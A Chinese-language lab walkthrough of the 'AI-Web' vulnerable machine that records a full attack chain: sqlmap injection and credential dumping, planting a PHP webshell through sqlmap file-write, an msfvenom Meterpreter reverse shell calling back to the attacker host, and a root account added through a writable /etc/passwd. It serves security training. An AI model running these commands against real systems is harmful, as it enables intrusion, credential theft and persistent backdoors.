# AI-Web 靶机实战

## 一、靶机信息

| 项目      | 信息                               |
| --------- | ---------------------------------- |
| 靶机名称  | AI-Web                             |
| 靶机 IP   | `172.20.10.4`                      |
| 攻击机 IP | `172.20.10.3`                      |
| 开放端口  | 80/tcp                             |
| Web 服务  | Apache httpd                       |
| 最终结果  | 获取 Meterpreter 会话，提权至 root |

## 二、信息收集

### 1. 端口扫描

```
nmap -sV 172.20.10.4
```

发现开放端口：

```
80/tcp open http Apache httpd
```

<img src=".\images\01.png" alt="01" style="zoom:33%;" />

<img src=".\images\02.png" alt="01" style="zoom:33%;" />

### 2. robots.txt 信息泄露

访问：

```
http://172.20.10.4/robots.txt
```

发现两个隐藏目录：

```
Disallow: /m3diNf0/
Disallow: /se3reTdir777/uploads/
```

访问目录：

```
http://172.20.10.4/m3diNf0/
http://172.20.10.4/se3reTdir777/uploads/
```

在 `/m3diNf0/` 中发现：

```
http://172.20.10.4/m3diNf0/info.php
```

<img src=".\images\03.png" alt="01" style="zoom:33%;" />

<img src=".\images\04.png" alt="01" style="zoom:33%;" />

### 3. 获取网站根目录

访问 `info.php`，获取 PHP 环境信息。

发现网站根目录：

```
/home/www/html/web1x443290o2sdf92213
```

## 三、SQL 注入漏洞利用

### 1. 发现 SQL 注入

访问：

```
http://172.20.10.4/se3reTdir777/
```

通过 Burp Suite 抓包，发现 POST 请求中的 `uid` 参数存在 SQL 注入。

关键请求：

```
POST /se3reTdir777/ HTTP/1.1
Host: 172.20.10.4
Content-Type: application/x-www-form-urlencoded

uid=1&Operation=Submit
```

将请求保存为 `text.txt`。

<img src=".\images\05.png" alt="01" style="zoom:33%;" />

### 2. SQLmap 检测注入

```
sqlmap -r Documents/text.txt --batch
```

<img src=".\images\06.png" alt="01" style="zoom:33%;" />

### 3. 获取数据库

```
sqlmap -r Documents/text.txt --batch --dbs
```

发现数据库：

```
aiweb1
```

<img src=".\images\07.png" alt="01" style="zoom:33%;" />

### 4. 获取数据表

```
sqlmap -r Documents/text.txt --batch -D aiweb1 --tables
```

发现：

```
user
systemUser
```

<img src=".\images\08.png" alt="01" style="zoom:33%;" />

### 5. 获取字段

```
sqlmap -r Documents/text.txt --batch -D aiweb1 -T systemUser --columns
```

<img src=".\images\09.png" alt="01" style="zoom:33%;" />

### 6. 导出账号密码

```
sqlmap -r Documents/text.txt --batch -D aiweb1 -T systemUser -C userName,password --dump
```

获取数据：

| 用户名    | Base64 密码                   |
| --------- | ----------------------------- |
| t00r      | `RmFrZVVzZXJQYXNzdzByZA==`    |
| aiweb1pwn | `TXlFdmlsUGFzc19mOTA4c2RhZjl` |
| u3er      | `TjB0VGhpczBuZUFsczA=`        |

### 7. Base64 解码

```
echo 'RmFrZVVzZXJQYXNzdzByZA==' | base64 -d
echo 'TXlFdmlsUGFzc19mOTA4c2RhZjl' | base64 -d
echo 'TjB0VGhpczBuZUFsczA=' | base64 -d
```

解码结果：

| 用户名    | 明文密码                          |
| --------- | --------------------------------- |
| t00r      | `FakeUserPassw0rd`                |
| aiweb1pwn | `MyEvilPass_f908sdaf9_sadfasf0sa` |
| u3er      | `N0tThis0neAls0`                  |

## 四、获取 WebShell

### 1. SQLmap 写入文件

利用 SQL 注入的文件写入功能，将本地 PHP WebShell 写入靶机。

```
sqlmap -r Documents/text.txt --batch \
--file-write="Documents/shell.php" \
--file-dest="/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/shell.php"
```

### 2. 访问 WebShell

```
http://172.20.10.4/se3reTdir777/uploads/shell.php
```

成功访问上传的 PHP 文件，获得命令执行入口。

<img src=".\images\10.png" alt="01" style="zoom:33%;" />

<img src=".\images\11.png" alt="01" style="zoom:33%;" />

## 五、反弹 Shell

### 1. 生成 Meterpreter 木马

攻击机执行：

```
msfvenom -p linux/x64/meterpreter/reverse_tcp \
LHOST=172.20.10.3 \
LPORT=1234 \
-f elf > shell.elf
```

<img src=".\images\12.png" alt="01" style="zoom:33%;" />

### 2. 建立监听

使用 Metasploit 配置监听：

```
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 172.20.10.3
set LPORT 1234
exploit
```

通过 WebShell 将 ELF 文件传输到靶机并执行。

成功获得 Meterpreter 会话。

<img src=".\images\13.png" alt="01" style="zoom:33%;" />

## 六、Linux 本地提权

### 1. 查看当前用户

获取 Shell 后，检查当前用户及权限：

```
id
whoami
```

<img src=".\images\14.png" alt="01" style="zoom:33%;" />

### 2. 检查 passwd 文件权限

发现 `/etc/passwd` 文件的所有者为当前用户，说明当前用户具有修改该文件的权限。

这是本次提权的关键突破口。

<img src=".\images\15.png" alt="01" style="zoom:33%;" />

### 3. 生成密码哈希

使用 Perl 的 `crypt()` 函数生成密码哈希：

```
perl -e 'print crypt("123456", "ad")'
```

将生成的哈希值用于 passwd 文件。

### 4. 创建 UID 为 0 的用户

在 `/etc/passwd` 中添加：

```
tom:生成的密码哈希:0:0:root:/root:/bin/bash
```

字段含义：

| 字段      | 含义                  |
| --------- | --------------------- |
| tom       | 用户名                |
| 密码哈希  | 密码加密结果          |
| 0         | UID，0 表示 root 权限 |
| 0         | GID                   |
| root      | 用户描述              |
| /root     | 用户家目录            |
| /bin/bash | 登录 Shell            |

<img src=".\images\16.png" alt="01" style="zoom:33%;" />

### 5. 切换用户

```
su tom
```

输入密码：

```
123456
```

### 6. 验证提权

```
id
whoami
```

成功获得 root 权限。

<img src=".\images\17.png" alt="01" style="zoom:33%;" />

## 七、最终结果

```
初始入口：Web 页面 SQL 注入
数据库：aiweb1
文件写入：SQLmap --file-write
WebShell：shell.php
反弹 Shell：Meterpreter
提权方式：修改 /etc/passwd
最终权限：root
```

## 八、实战总结

本次靶机主要涉及以下知识点：

1. **信息收集**：通过 robots.txt 发现隐藏目录。
2. **目录探测**：进一步访问隐藏目录，发现 PHP 信息页面。
3. **环境信息收集**：通过 phpinfo 获取网站绝对路径。
4. **SQL 注入**：使用 Burp Suite 抓取 POST 请求，利用 SQLmap 自动化检测。
5. **数据库信息获取**：枚举数据库、数据表、字段并导出账号密码。
6. **编码识别**：识别 Base64 编码并还原明文。
7. **文件写入**：利用 SQLmap 的文件写入功能上传 PHP WebShell。
8. **反弹 Shell**：使用 msfvenom 生成 ELF 木马，通过 Metasploit 获取 Meterpreter 会话。
9. **Linux 提权**：发现 `/etc/passwd` 文件权限配置错误，通过创建 UID=0 的用户获得 root 权限。

## 九、关键命令整理

| 功能          | 命令                                                         |
| ------------- | ------------------------------------------------------------ |
| 扫描端口      | `nmap -sV IP`                                                |
| SQLmap 检测   | `sqlmap -r text.txt --batch`                                 |
| 获取数据库    | `sqlmap -r text.txt --batch --dbs`                           |
| 获取数据表    | `sqlmap -r text.txt -D aiweb1 --tables`                      |
| 获取字段      | `sqlmap -r text.txt -D aiweb1 -T systemUser --columns`       |
| 导出数据      | `sqlmap -r text.txt -D aiweb1 -T systemUser -C userName,password --dump` |
| Base64 解码   | `echo '内容' | base64 -d`                                    |
| SQLmap 写文件 | `--file-write --file-dest`                                   |
| 生成 ELF      | `msfvenom -p linux/x64/meterpreter/reverse_tcp ... -f elf`   |
| 查看用户      | `id && whoami`                                               |
| Perl 生成哈希 | `perl -e 'print crypt("123456", "ad")'`                      |

## 十、个人复盘

本次实战完整走通了：

**信息收集 → SQL 注入 → 数据库信息获取 → 文件写入 → WebShell → Meterpreter → Linux 提权**

重点收获：

- robots.txt 不只是搜索引擎配置文件，也可能泄露隐藏目录。
- phpinfo 可以帮助获取 Web 环境和网站绝对路径。
- SQLmap 不仅可以获取数据库内容，也具备文件读写能力，但文件写入受数据库账户权限、数据库配置及 Web 目录权限限制。
- Meterpreter 会话不等于 root 权限，拿到初始 Shell 后仍然需要进行本地提权枚举。
- `/etc/passwd` 可写是严重的权限配置错误，UID 为 0 的账户具有 root 身份。

**本次核心提权点：**`**/etc/passwd**` **文件权限配置错误。**